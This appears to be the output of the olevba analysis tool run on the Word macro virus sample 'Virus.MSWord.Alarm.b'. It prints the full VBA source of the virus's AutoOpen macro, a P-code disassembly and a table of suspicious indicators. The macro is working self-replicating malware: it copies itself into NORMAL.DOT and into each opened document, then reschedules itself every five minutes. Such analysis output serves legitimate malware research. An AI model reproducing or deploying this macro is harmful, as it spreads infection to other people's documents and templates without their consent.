olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Alarm.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Alarm.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Alarm.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim MyFile$
Dim x
Dim normal
Dim OkExist
Dim i
Dim TemplateName$
Dim active
Dim internal
Dim alarmtime
Dim alarm$

' set document mode
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
MyFile$ = WordBasic.[FileName$]()
If InStr(1, MyFile$, "文档") = 1 Then
    x = WordBasic.Dialog.FileSaveAs(dlg)
    MyFile$ = dlg.Name
'   MsgBox MyFile$, Str$(dlg.AddToMru), 64
Else
'   dlg.Format = 0
      WordBasic.CurValues.FileSaveAs dlg
    MyFile$ = dlg.Name
'   MsgBox MyFile$, Str$(dlg.AddToMru), 64
End If

' if it is Macro Document, then goto bye2
If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

' if Document is new, then goto Bye1
If MyFile$ = "" Then GoTo Bye1

' Save file as template
If dlg.Format = 0 Then
    WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
Else
    WordBasic.FileSave
End If

' search macro AutoOpen in Normal template
normal = WordBasic.CountMacros(0)
OkExist = 0
For i = 1 To normal
    If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
Next i

' Get normal template name
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
'MsgBox TemplateName$, "", 64

' copy AutoOpen to normal template
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
'   Organizer .Copy, .Source = MyFile$, .Destination = TemplateName$, .Name = "SaveDoc", .Tab = 3
    WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
End If

' search macro AutoOpen in active document
active = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To active
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

' copy AutoOpen to active template
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
'   Organizer .Copy, .Source = TemplateName$, .Destination = MyFile$, .Name = "SaveDoc", .Tab = 3
    WordBasic.FileSave
End If

Bye1:

' set document mode
dlg.Format = 0

Bye2:

' set timer to run AutoOpen again
internal = 5 / 24 / 60 ' internal time is 5 minutes
alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
alarm$ = WordBasic.[Time$](alarmtime)
WordBasic.OnTime alarm$, "AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Alarm.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 5231 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn MyFile
' Line #3:
' 	Dim 
' 	VarDefn x
' Line #4:
' 	Dim 
' 	VarDefn normal
' Line #5:
' 	Dim 
' 	VarDefn OkExist
' Line #6:
' 	Dim 
' 	VarDefn i
' Line #7:
' 	Dim 
' 	VarDefn TemplateName
' Line #8:
' 	Dim 
' 	VarDefn active
' Line #9:
' 	Dim 
' 	VarDefn internal
' Line #10:
' 	Dim 
' 	VarDefn alarmtime
' Line #11:
' 	Dim 
' 	VarDefn alarm
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0012 " set document mode"
' Line #14:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld MyFile$ 
' 	LitStr 0x0004 "文档"
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St x 
' Line #18:
' 	Ld dlg 
' 	MemLd New 
' 	St MyFile$ 
' Line #19:
' 	QuoteRem 0x0000 0x0029 "   MsgBox MyFile$, Str$(dlg.AddToMru), 64"
' Line #20:
' 	ElseBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0011 "   dlg.Format = 0"
' Line #22:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	Ld dlg 
' 	MemLd New 
' 	St MyFile$ 
' Line #24:
' 	QuoteRem 0x0000 0x0029 "   MsgBox MyFile$, Str$(dlg.AddToMru), 64"
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	QuoteRem 0x0000 0x0028 " if it is Macro Document, then goto bye2"
' Line #28:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye2 
' 	EndIf 
' Line #29:
' Line #30:
' 	QuoteRem 0x0000 0x0023 " if Document is new, then goto Bye1"
' Line #31:
' 	Ld MyFile$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye1 
' 	EndIf 
' Line #32:
' Line #33:
' 	QuoteRem 0x0000 0x0016 " Save file as template"
' Line #34:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld MyFile$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed LockAnnot 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitDI2 0x0001 
' 	ParamNamed AddToMru 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0000 
' 	ParamNamed SaveAsAOCELetter 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x000B 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	QuoteRem 0x0000 0x0029 " search macro AutoOpen in Normal template"
' Line #41:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St normal 
' Line #42:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld normal 
' 	For 
' Line #44:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St OkExist 
' 	EndIf 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' Line #47:
' 	QuoteRem 0x0000 0x0019 " Get normal template name"
' Line #48:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	St TemplateName$ 
' Line #49:
' 	QuoteRem 0x0000 0x001C "MsgBox TemplateName$, "", 64"
' Line #50:
' Line #51:
' 	QuoteRem 0x0000 0x0021 " copy AutoOpen to normal template"
' Line #52:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #53:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld MyFile$ 
' 	ParamNamed Source 
' 	Ld TemplateName$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #54:
' 	QuoteRem 0x0000 0x0060 "   Organizer .Copy, .Source = MyFile$, .Destination = TemplateName$, .Name = "SaveDoc", .Tab = 3"
' Line #55:
' 	Ld TemplateName$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed LockAnnot 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0000 
' 	ParamNamed SaveAsAOCELetter 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x000B 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	QuoteRem 0x0000 0x0029 " search macro AutoOpen in active document"
' Line #59:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St active 
' Line #60:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld active 
' 	For 
' Line #62:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St OkExist 
' 	EndIf 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x0021 " copy AutoOpen to active template"
' Line #66:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld TemplateName$ 
' 	ParamNamed Source 
' 	Ld MyFile$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #68:
' 	QuoteRem 0x0000 0x0060 "   Organizer .Copy, .Source = TemplateName$, .Destination = MyFile$, .Name = "SaveDoc", .Tab = 3"
' Line #69:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	Label Bye1 
' Line #73:
' Line #74:
' 	QuoteRem 0x0000 0x0012 " set document mode"
' Line #75:
' 	LitDI2 0x0000 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #76:
' Line #77:
' 	Label Bye2 
' Line #78:
' Line #79:
' 	QuoteRem 0x0000 0x0020 " set timer to run AutoOpen again"
' Line #80:
' 	LitDI2 0x0005 
' 	LitDI2 0x0018 
' 	Div 
' 	LitDI2 0x003C 
' 	Div 
' 	St internal 
' 	QuoteRem 0x0017 0x001B " internal time is 5 minutes"
' Line #81:
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd TimeValue 0x0001 
' 	Ld internal 
' 	Add 
' 	St alarmtime 
' Line #82:
' 	Ld alarmtime 
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0001 
' 	St alarm$ 
' Line #83:
' 	Ld alarm$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall OnTime 0x0002 
' Line #84:
' Line #85:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

